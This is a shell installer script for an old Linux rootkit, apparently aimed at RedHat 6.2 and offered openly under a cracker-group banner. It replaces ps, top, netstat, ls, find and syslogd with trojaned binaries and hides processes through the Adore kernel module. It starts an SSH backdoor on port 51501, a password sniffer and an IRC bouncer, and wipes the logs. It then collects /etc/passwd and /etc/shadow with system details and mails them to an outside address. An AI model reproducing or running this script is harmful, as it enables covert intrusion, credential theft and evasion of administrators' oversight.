#!/bin/sh
#Prepare our environment
unset HISTFILE
STARTDIR=`pwd`
CARDLOG="/usr/lib/locale/ro_RO/uboot/card.log"
DIR="/usr/lib/locale/ro_RO/uboot"
SMP=`uname -a | grep SMP | wc -l`
#----------------------------------------------------
#Define a few functions that will simplify the installation script
test_x()
{
 if [ -x /usr/X11R6/bin/startx ];
  then HAS_X=1
  else HAS_X=0
 fi
}

test_gcc()
{
 if [ -x /usr/bin/gcc ];
  then HAS_GCC=1
  else HAS_GCC=0
 fi
}

test_smp()
{
 if [ $SMP -eq 1 ];
  then cp -f Makefile.smp Makefile
  else cp -f Makefile.non-smp Makefile
 fi
}

test_h()
{
 if [ -d /usr/src/linux/include/linux ];
  then
    echo "Kernel sources are installed. ADORE will be properly compiled."
  elif [ -d /usr/include/linux ];
  then
    echo "Kernel sources are NOT installed, using default kernel headers instead."
    echo "ADORE will probably NOT compile correctly."
    echo "I recommend you should install kernel-sources first, and then re-run"
    echo "this script"
    echo "#include <linux/modsetver.h>" >/usr/include/linux/modversions.h
 fi
}

compile()
{
 test_gcc
 if [ $HAS_GCC -eq 1 ];
  then
  test_x
    if [ $HAS_X -eq 1 ];
     then 
	test_smp
	test_h
	make 
	mv -f ava /usr/bin/weather
	rm -f *.c *.h Makefile* 
     else echo "This system doesn't have an X server. ADORE isn't required :)"
    fi
 else echo "This system doesn't have GCC. Cannot compile ADORE :("
 fi
}

#----------------------------------------------------
#Proceed to install
clear
echo "S---- samae| AKA U-B00T's rootkit v5.1 ----S"
echo "| -<| GREETS 2 RSHA, Amorph|s & Tartar |>- |"
echo "A------------------------------------------A"
echo "|         Together we are S.A.R.T.         |"
echo "R------------------------------------------R"
echo "|       This is the RedHat 6.2 build       |"
echo "T------------------------------------------T"
echo "     *-------------------------------*"
echo "     |   adore        =      0.38    |"
echo "     |   sshd         =    1.2.32    |"
echo "     |   lrk          =    SECRET    |"
echo "     |   bnc          =     2.8.2    |"
echo "     |   dsniff       =       2.2    |"
echo "     |   chkrootkit   =      0.33    |"
echo "     |   scanner      =     mass4    |"
echo "     *-------------------------------*"

sleep 5
clear

mkdir -p $DIR
mkdir -p $DIR/etc

cp -rf * $DIR/ >>/dev/null
cd $DIR

echo "Installing trojaned system files ..."

echo "[*] Process tools ..."

echo " |---ps"
chattr -aiu /bin/ps
./sz /bin/ps ps
mv -f ps /bin/ps
chattr +aiu /bin/ps
echo " |   \\"
echo " |    |-- done replacing ps "

sleep 1

echo " |---pstree"
chattr -aiu /usr/bin/pstree
./sz /usr/bin/pstree pstree
mv -f pstree /usr/bin/pstree
chattr +aiu /usr/bin/pstree
echo " |   \\"
echo " |    |-- done replacing pstree "

sleep 1

echo " |---top"
chattr -aiu /usr/bin/top
./sz /usr/bin/top top
mv -f top /usr/bin/top
chattr +aiu /usr/bin/top
echo " |   \\"
echo " |    |-- done replacing top "
echo " |----|"
sleep 5

echo "[*] Network tools ..."

echo " |---netstat"
chattr -aiu /bin/netstat
./sz /bin/netstat netstat
mv -f netstat /bin/netstat
chattr +aiu /bin/netstat
echo " |   \\"
echo " |    |-- done replacing netstat "

sleep 1

echo " |---ifconfig"
chattr -aiu /sbin/ifconfig
./sz /sbin/ifconfig ifconfig
mv -f ifconfig /sbin/ifconfig
chattr +aiu /sbin/ifconfig
echo " |   \\"
echo " |    |-- done replacing ifconfig "
echo " |----|"

sleep 5

echo "[*] Filesystem tools ..."

echo " |---find"
chattr -aiu /usr/bin/find
./sz /usr/bin/find find
mv -f find /usr/bin/find
chattr +aiu /usr/bin/find
echo " |   \\"
echo " |    |-- done replacing find "

sleep 1

echo " |---ls"
chattr -aiu /bin/ls
./sz /bin/ls ls
mv -f ls /bin/ls
chattr +aiu /bin/ls
echo " |   \\"
echo " |    |-- done replacing ls "
echo " |----|"

echo " |---dir"
chattr -aiu /usr/bin/dir
./sz /usr/bin/dir dir
mv -f dir /usr/bin/dir
chattr +aiu /usr/bin/dir
echo " |   \\"
echo " |    |-- done replacing dir "
echo " |----|"

sleep 1

echo "[*] System tools ..."

echo " |---syslogd"
chattr -aiu /sbin/syslogd
./sz /sbin/syslogd syslogd
mv -f syslogd /sbin/syslogd
chattr +aiu /sbin/syslogd
echo " |   \\"
echo " |    |-- done replacing syslog "
echo " |----|"
rm -f /var/log/messages
touch /var/log/messages
/etc/rc.d/init.d/syslog restart
sleep 1

# Chestia asta dupa ce compilez afbackup cu banner de sshd de pe rh70:"

#echo "[*] Trying to replace sshd (if available) ..."
#if [ -x /usr/sbin/sshd ];
# then
#  echo "sshd is installed. replacing ..."
#  ./sz /usr/sbin/sshd afbackup
#  /etc/rc.d/init.d/sshd stop
#  cp -f afbackup /usr/sbin/sshd
#  /etc/rc.d/init.d/sshd start
#fi
  
echo "[*] Trying to install ADORE ..."
cd $DIR
compile

echo "[*] Replacing /etc/rc.d/init.d/network with ours ..."
mv -f network /etc/rc.d/init.d/network
sleep 5
mv -f twist2open /usr/bin/
cd $DIR
echo "[*] Starting services ..."
/sbin/insmod adore.o >>/dev/null 2>&1;
/sbin/insmod cleaner.o >>/dev/null 2>&1;
/sbin/rmmod cleaner >>/dev/null 2>&1;
echo " |---backdoor ..."
./afbackup -q -p 51501 -f $DIR/sshd_conf -h $DIR/hostkey >>/dev/null 2>&1
/usr/bin/weather i `/sbin/pidof afbackup` >>./hide.log 2>&1
echo " |    |-- done"
echo " |---sniffer ..."
./sniff/sbin/dsniff -i eth0 -n -w $DIR/sniff/sniff.log >>/dev/null 2>&1 &
/usr/bin/weather i `/sbin/pidof dsniff` >>./hide.log 2>&1
echo " |    |-- done"
echo " |---bnc ..."
./bnc >>/dev/null 2>&1
/usr/bin/weather i `/sbin/pidof bnc` >>./hide.log 2>&1
echo " |   \\"
echo " |    |-- done"
echo " |----|"
rm -f ./*pid* /*pid* /*log*
sleep 5

echo "[*] Gathering system info ..."
echo " |---uname -a"
uname -a >>file
echo "|------" >>file
echo " |---ifconfig"
/sbin/ifconfig >>file
echo "|------" >>file
echo " |---passwd file"
cat /etc/passwd >>file
echo " |---shadow file"
echo "|------" >>file
cat /etc/shadow >>file
echo " |---ping statistics"
ping -c 5 216.115.108.245 >>file 
echo " |   \\"
echo " |    |-- done"
echo "[*] Fixing vulns ..."
echo " |---.bash_history"
chattr +ia /root/.bash_history
echo " |---ftpd"
chmod -s /var/ftp/*
echo " |---rpc"
chmod -s /usr/bin/rpc*
chmod -s /usr/sbin/rpc*
chmod -s /sbin/rpc*
echo " |---named"
chmod -s /var/named
echo " |   \\"
echo " |    |-- done"
echo " |----|"
sleep 5
echo "[*] Adding sniffer's cron information ..."
mv -f s3nd10gz /etc/cron.weekly/
/etc/rc.d/init.d/crond restart
sleep 5
echo "[*] Cleaning logs. This will take a while ..."
./logcleaner ftp >>/dev/null
./logcleaner rpc >>/dev/null
./logcleaner named >>/dev/null
./logcleaner yahoo >>/dev/null
./logcleaner bind >>/dev/null
./logcleaner geocities >>/dev/null
./logcleaner hypermart >>/dev/null
./logcleaner syslogd >>/dev/null
echo " |   \\"
echo " |    |-- done"
echo " |----|"
echo "[*] Mailing system information ..."
mail -s "`hostname`" romanianh@yahoo.com <file
rm -f file
cd $STARTDIR
rm -rf ../*rh*
echo "Rootkit successfully installed. Enjoy !"
